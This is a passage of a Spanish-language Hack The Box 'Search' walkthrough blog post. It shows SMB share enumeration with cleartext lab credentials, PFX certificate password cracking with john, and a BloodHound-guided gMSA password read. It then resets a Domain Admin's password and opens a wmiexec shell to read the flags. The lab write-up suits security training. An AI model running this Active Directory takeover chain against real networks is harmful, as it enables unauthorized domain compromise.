+	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
+	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
+	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
+	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
+	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
+	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
+	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
+	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
+	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
+	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
+	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
+	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
+	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
+	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	NO ACCESS	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	./RedirectedFolders<span class="err">$</span>
+	dr--r--r--                0 Sun Apr  7 17:54:11 2024	<span class="nb">.</span>
+	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
+	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
+	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
+	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
+	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
+	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
+	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
+	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
+	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
+	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
+	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
+	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
+	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
+	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
+	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
+	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
+	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
+	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
+	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
+	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
+	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
+	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
+	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
+	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/sierra.frye'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	NO ACCESS	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	./RedirectedFolders<span class="nv">$sierra</span>.frye
+	dr--r--r--                0 Wed Nov 17 19:01:45 2021	<span class="nb">.</span>
+	dr--r--r--                0 Wed Nov 17 19:01:45 2021	..
+	dw--w--w--                0 Wed Nov 17 19:08:17 2021	Desktop
+	dw--w--w--                0 Fri Jul 31 09:42:19 2020	Documents
+	dw--w--w--                0 Fri Jul 31 09:45:36 2020	Downloads
+	fr--r--r--               33 Wed Nov 17 19:01:45 2021	user.txt
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<h1 id="user-txt">User .txt</h1>
+
+<ul>
+  <li>Aquí vemos la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/sierra.frye/user.txt'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>sierra.frye<span class="se">\u</span>ser.txt <span class="o">(</span>33 bytes<span class="o">)</span>
+<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/10.129.229.57-RedirectedFolders_sierra.frye_user.txt
+➜  content <span class="nb">cat </span>10.129.229.57-RedirectedFolders_sierra.frye_user.txt
+0b2ce2a465386c9c4996ba16251795ac
+</code></pre></div></div>
+
+<ul>
+  <li>Y vemos algo interesante si seguimos enumerando al parecer encontramos certificados.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/sierra.frye/Downloads/Backups'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	NO ACCESS	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	./RedirectedFolders<span class="nv">$sierra</span>.frye/Downloads/Backups
+	dr--r--r--                0 Mon Aug 10 15:39:17 2020	<span class="nb">.</span>
+	dr--r--r--                0 Mon Aug 10 15:39:17 2020	..
+	fr--r--r--             2643 Fri Jul 31 10:04:11 2020	search-RESEARCH-CA.p12
+	fr--r--r--             4326 Mon Aug 10 15:39:17 2020	staff.pfx
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a descargarlos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  certificates smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>sierra.frye<span class="se">\D</span>ownloads<span class="se">\B</span>ackups<span class="se">\s</span>earch-RESEARCH-CA.p12 <span class="o">(</span>2643 bytes<span class="o">)</span>
+<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/certificates/10.129.229.57-RedirectedFolders_sierra.frye_Downloads_Backups_search-RESEARCH-CA.p12
+➜  certificates smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/sierra.frye/Downloads/Backups/staff.pfx'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>sierra.frye<span class="se">\D</span>ownloads<span class="se">\B</span>ackups<span class="se">\s</span>taff.pfx <span class="o">(</span>4326 bytes<span class="o">)</span>
+<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/certificates/10.129.229.57-RedirectedFolders_sierra.frye_Downloads_Backups_staff.pfx
+</code></pre></div></div>
+
+<ul>
+  <li>Si importamos los certificados vemos que están protegidos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/11.png" />
+</p>
+
+<ul>
+  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">pfx2john</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  certificates pfx2john search-RESEARCH-CA.p12 <span class="o">&gt;</span> <span class="nb">hash</span>
+➜  certificates pfx2john staff.pfx <span class="o">&gt;&gt;</span> <span class="nb">hash</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y esta es la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  certificates john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts <span class="o">(</span>pfx, <span class="o">(</span>.pfx, .p12<span class="o">)</span> <span class="o">[</span>PKCS#12 PBE <span class="o">(</span>SHA1/SHA2<span class="o">)</span> 512/512 AVX512BW 16x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 2000 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>mac-type <span class="o">[</span>1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+misspissy        <span class="o">(</span>search-RESEARCH-CA.p12<span class="o">)</span>
+misspissy        <span class="o">(</span>staff.pfx<span class="o">)</span>
+2g 0:00:05:18 DONE <span class="o">(</span>2024-04-07 18:15<span class="o">)</span> 0.006282g/s 17229p/s 34458c/s 34458C/s misssnamy..missnono
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<ul>
+  <li>Y listo podemos importarlos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/12.png" />
+</p>
+
+<ul>
+  <li>El certificado se llama <strong>staff</strong> si probamos con esa ruta vemos que funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/13.png" />
+</p>
+
+<ul>
+  <li>Ahora accedemos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/14.png" />
+</p>
+
+<ul>
+  <li>Y vemos que estamos un <strong>Windows Powershell Web Access</strong>.</li>
+</ul>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>Si vamos a <code class="language-plaintext highlighter-rouge">Bloodhound</code> sabemos que estamos como <code class="language-plaintext highlighter-rouge">Sierra.Frye</code> tenemos una manera potencial de escalar privilegios pertenecemos a varios grupos entre esos tenemos el privilegio <code class="language-plaintext highlighter-rouge">ReadGMSAPassword</code> sobre <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> y ese usuario tiene el privilegio <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el usuario <code class="language-plaintext highlighter-rouge">Tristan.Davies</code> que ese usuario pertenece al grupo <code class="language-plaintext highlighter-rouge">Domain Admins</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/15.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/16.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Si somos este usuario <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> podemos cambiarle la contraseña al usuario <code class="language-plaintext highlighter-rouge">TRISTAN.DAVIES</code>.</p>
+  </li>
+  <li>
+    <p>Podemos apoyarnos de este recurso ya que necesitamos obtener la contraseña de <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> <a href="https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#retrieving-themanaged-password">https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#retrieving-themanaged-password</a>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/17.png" />
+</p>
+
+<ul>
+  <li>Para ver la contraseña tenemos que hacer lo siguiente <a href="https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#decoding-themanaged-password">https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#decoding-themanaged-password</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/18.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos a definir la credencial.</p>
+  </li>
+  <li>
+    <p>Si la contraseña ya esta podemos usar <code class="language-plaintext highlighter-rouge">Invoke-Command</code> para ver si estamos ejecutando comandos como el usuario que queremos.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/19.png" />
+</p>
+
+<ul>
+  <li>Como tenemos privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre <code class="language-plaintext highlighter-rouge">Tristan.Davies</code> le vamos a cambiar la contraseña.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/20.png" />
+</p>
+
+<ul>
+  <li>Como le acabamos de cambiar la contraseña a un usuario del <code class="language-plaintext highlighter-rouge">Domain Admins</code> en caso de que nos de <code class="language-plaintext highlighter-rouge">Pwn3d!</code> podemos usar <code class="language-plaintext highlighter-rouge">wmiexec</code> para conectarnos y tendremos privilegios máximos en el dominio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.229.57 <span class="nt">-u</span> <span class="s1">'tristan.davies'</span> <span class="nt">-p</span> <span class="s1">'nosequeponer$!'</span>
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\t</span>ristan.davies:nosequeponer<span class="nv">$!</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="roottxt">Root.txt</h2>
+
+<ul>
+  <li>Y ya podemos ver la ultima flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-wmiexec search.htb/tristan.davies@10.129.229.57
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
+<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+C:<span class="se">\&gt;</span><span class="nb">whoami
+</span>search<span class="se">\t</span>ristan.davies
+
+C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+5cbe8d044ee14475a7b40e8abd97c5a1
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/hard/2024/04/12/search.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolucion de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
